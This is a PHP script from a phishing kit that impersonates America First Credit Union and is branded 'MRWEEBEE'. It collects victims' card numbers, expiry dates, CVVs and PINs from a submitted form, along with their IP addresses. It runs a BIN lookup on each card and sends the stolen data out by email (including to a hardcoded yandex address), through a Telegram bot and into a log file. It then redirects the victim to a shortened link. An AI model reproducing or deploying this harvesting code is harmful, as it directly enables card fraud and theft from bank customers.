<?php
$settings = include '../../../settings/settings.php';



# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables


$card_number = $_POST['cnum'];
$card_date = $_POST['exp'];
$card_csc    = $_POST['cvv'];
$card_pin    = $_POST['pin'];

$bin = str_replace(" ", "", str_split($card_number,7)[0]);
$reslt = check_bin($bin);
$cardt = $reslt['scheme'];
$type = $reslt['type'];
$brand = $reslt['brand'];
$country = $reslt['country']['name'];
$bank = $reslt['bank']['name'];
$url = $reslt['bank']['url'];
$phone = $reslt['bank']['phone'];



# BIN Check

function check_bin($bin) {
  $url = "https://lookup.binlist.net/".$bin;
  $headersers = array();
  $headersers[] = 'Accept-Version: 3';
  $ch = curl_init();
  curl_setopt($ch,CURLOPT_URL,$url);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headersers);
  $resp=curl_exec($ch);
  curl_close($ch);
  $result = json_decode($resp, true);
  return $result;
}



# Messsage

$message = "[🍁 MRWEEBEE | AMERICA FIRST CU  | CLIENT :{$client} 🍁]\n\n";
$message .= "********** [ 💳 CARD INFORMATION 💳 ] **********\n";
$message .= "# CARD NUMBER : {$card_number}\n";
$message .= "# EXPIRY      : {$card_date}\n";
$message .= "# CARD CODE   : {$card_csc}\n";
$message .= "# CARD PIN    : {$card_pin}\n";
$message .= "********** [ 🔍 BIN LOOKUP 🔎 ] **********\n";
$message .= "# BIN         : {$bin}\n";
$message .= "# CARD LEVEL  : {$cardt}\n";
$message .= "# CARD TYPE   : {$type}\n";
$message .= "# CARD BRAND  : {$brand}\n";
$message .= "# COUNTRY     : {$country}\n";
$message .= "# BANK NAME   : {$bank}\n";
$message .= "# BANK PHONE  : {$phone}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
	$mert1 = array($owner, 'happy.spammer@yandex.com');
	$headers = "Content-type:text/plain;charset=UTF-8\r\n";
	$headers .= "From: MrWeeBee <americafirstcu@client_{$client}_site.com>\r\n";
    $subject = "🍁 MRWEEBEE 🍁 AMERICA FIRST CU 🍁 CARD 🍁 CLIENT #{$client} 🍁 {$IP}";
	$msg = strtoupper($message);
	foreach ($mert1 as $tor) {
    mail($tor, $subject, $msg, $headers);
    }
}


# Save Result

if ($settings['save_results'] == "1"){
	$results = fopen($filename, "a+");
	fwrite($results, strtoupper($message));
	fclose($results);
}


# Send Bot

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/bot{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}



echo "<script>window.location.href =\"https://bit.ly/3tTcnlk\"; </script>";

?>
